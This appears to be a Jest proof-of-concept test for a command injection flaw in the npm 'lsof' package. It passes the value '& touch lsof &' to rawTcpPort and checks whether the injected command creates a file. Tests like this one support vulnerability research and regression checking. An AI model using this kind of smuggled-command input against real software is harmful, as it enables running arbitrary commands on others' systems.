const v18 = require('assert');
const doesNotMatch = v18.doesNotMatch;
const v33 = done => {
    const v19 = expect.assertions(2);
    v19;
    const root = require('lsof');
    const fs = require('fs');
    const path = './lsof';
    try {
        const v20 = fs.existsSync(path);
        if (v20) {
            const v21 = fs.unlinkSync(path);
            v21;
            const v22 = console.log('File removed:', path);
            v22;
        }
    } catch (err) {
        const v23 = console.error(err);
        v23;
    }
    file_exist = fs.existsSync(path);
    const v24 = expect(file_exist);
    const v25 = v24.toBe(false);
    v25;
    let attack_code = '& touch lsof &';
    const v31 = function () {
        file_exist = fs.existsSync(path);
        const v26 = expect(file_exist);
        const v27 = v26.toBe(true);
        v27;
        const v29 = function (err) {
            const v28 = done();
            v28;
        };
        const v30 = fs.unlink(path, v29);
        v30;
    };
    const v32 = root.rawTcpPort(attack_code, v31);
    v32;
};
const v34 = test('Command Injection in lsof', v33);
v34;